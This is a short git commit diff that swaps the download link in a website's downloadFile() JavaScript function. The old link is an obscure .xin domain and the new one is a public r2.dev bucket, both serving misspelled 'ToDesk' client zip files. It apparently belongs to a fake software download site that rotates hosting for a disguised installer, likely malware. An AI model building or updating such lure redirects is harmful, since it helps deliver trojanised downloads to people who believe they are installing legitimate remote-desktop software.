560b555a58f0d8613bac2b502ff42136f297a7e6
aa168188aaaa <lisiajlekjw@gmail.com>
2025-05-02 23:11:41 +0800

    Update filename.js

--- static/js/filename.js
+++ static/js/filename.js
@@ -1,4 +1,4 @@
 ﻿// JavaScript函数设定下载URL并导航到下载页面
 function downloadFile() {
-  window.location.href = 'https://dwn.eolaoiemsnelao.xin/aiole/todesk/tdosk_lxoxie-X64.zip';
+  window.location.href = 'https://pub-addb8ef101184b368c467ebe49c123d9.r2.dev/MOPPToDeskCliemt_XP-Win11astueup_v6337.142.zip';
 }
